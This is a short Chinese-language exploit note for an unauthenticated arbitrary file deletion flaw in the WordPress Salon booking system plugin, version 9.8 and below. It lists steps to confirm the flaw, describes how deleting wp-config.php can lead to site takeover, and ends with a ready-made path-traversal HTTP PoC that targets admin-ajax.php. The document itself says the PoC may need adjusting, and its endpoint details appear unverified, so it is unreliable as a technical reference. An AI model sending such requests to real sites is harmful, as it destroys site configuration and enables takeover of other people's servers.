验证漏洞存在方法
    - 检查目标WordPress网站是否安装了Salon booking system插件
    - 检查插件版本是否为9.8或更低版本
    - 尝试通过未授权访问插件相关功能端点

漏洞利用方法
    - 该漏洞允许未经身份验证的攻击者删除服务器上的任意文件
    - 攻击者可以利用文件上传功能中的路径验证缺陷，构造恶意请求删除关键系统文件
    - 通过删除wp-config.php文件，攻击者可以导致WordPress站点无法正常运行，甚至实现站点接管
    - 漏洞利用可能导致远程代码执行，因为删除关键配置文件可能允许攻击者重新配置站点

PoC示例：
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="action"

salon_booking_delete_file
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file_path"

../../../wp-config.php
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

注意：实际PoC可能需要根据具体插件实现进行调整。此漏洞利用需要构造特定的HTTP请求来触发文件删除功能中的路径遍历漏洞。
